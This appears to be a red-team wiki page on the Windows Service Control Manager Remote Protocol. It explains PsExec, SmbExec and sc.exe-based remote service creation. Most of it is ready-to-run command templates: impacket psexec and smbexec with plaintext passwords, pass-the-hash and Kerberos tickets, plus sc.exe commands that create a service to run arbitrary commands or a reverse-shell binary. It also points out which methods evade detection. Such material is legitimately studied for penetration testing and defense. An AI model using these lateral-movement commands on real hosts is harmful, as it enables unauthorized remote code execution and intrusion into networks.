---
label: MS-SCMR
---

# MS-SCMR: Service Control Manager Remote Protocol

Through the MS-SCMR (RPC) protocol, Windows allows remote communication with another machine's Service Control Manager (SCM). This allows, among other things, remote startup of services on another machine. This capability ultimately allows the user to execute code on another machine (by creating a service), which is the basis for attacks like PsExec and SmbExec.

PsExec and SmbExec are well-known attacks designed to establish a pseudo-interactive "shell" on the target machine. Both attacks require access to SMB shares of the target host (445/TCP) for establishing two-way communication via named pipes.  

It is worth remembering that remote service creation is a built-in feature of standard `sc.exe`. There is no magic here, it is a standard feature of Windows. Without SMB access, the service will execute, but we cannot provide a malicious binary to the service or receive a response.

## PsExec

> **IMPORTANT**: A user who wants to use PsExec on a remote machine must have access to its `ADMIN$` SMB share. Without SMB access, it is not possible to use PsExec.

Linux:

```bash
# Using plaintext password
impacket-psexec $domain/$user:$password@$host

# Using NT hash
impacket-psexec -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-psexec $domain/$user@$host -k -nopass
```

Windows ([SysInternals - PsExec.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)):

```powershell
# Using plaintext password
.\PsExec.exe -accepteula -u $user -p $password \\$HOST cmd

# Using Kerberos TGT (in-memory)
.\PsExec.exe -accepteula -u $user \\$HOST cmd
```

PsExec works by writing an `.exe` binary to the `ADMIN$` SMB share on the target host. Because of that, a user requires write access to that share. Then, SCM is called remotely (via RPC) to execute the binary using created service. Binary creates a named pipe accessible via SMB. This named pipe is used by the user to execute commands remotely and read output. Communication is established via SMB (445/TCP).

> **NOTE**: PsExec leaves artifacts behind that require manual cleaning. The uploaded binary is is not automatically removed from the SMB share.

## SmbExec

Linux:

```bash
# Using plaintext password
impacket-smbexec $domain/$user:$password@$host

# Using NT hash
impacket-smbexec -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-smbexec $domain/$user@$host -k -nopass
```

Unlike PsExec, SmbExec avoids transferring a potentially detectable binary to the target host. The trick is that instead of using a malicious binary, SmbExec launches a new service (using SCM remotely via RPC) with each new command, executes the command in the `binPath` parameter of the service and closes the service. For every command a user type into "shell", a new service is created and the process is repeated. It just executes each desired command as a new service. Communication is established via SMB (445/TCP).

SmbExec is considered as a stealthier alternative to noisy and easy to detect PsExec. Nevertheless, it is important to remember that an event log is created for every command executed (service creation).

## ScExec

You can use the standard Windows tool `sc.exe` to run a service on a remote machine. It can be a single shell command or, for example, a reverse-shell binary sent over SMB.

> **NOTE**: Watch out for spaces in arguments. They are necessary!

Windows:

```powershell
# Create and start service
sc \\$host create $svc_name binPath= "cmd.exe /c $command" start= auto
sc \\$host start $svc_name

# Stop and delete service
sc \\$host stop $svc_name
sc \\$host delete $svc_name
```

TBD: Logon type and how to provide credentials to `sc.exe`.

## References

* [Rift, _SMBExec: Red Side Analysis](https://rift.stacktitan.com/smbexec/)
* [Boitatech, _SmbExec/ScExec_](https://hacktricks.boitatech.com.br/windows/ntlm/smbexec)
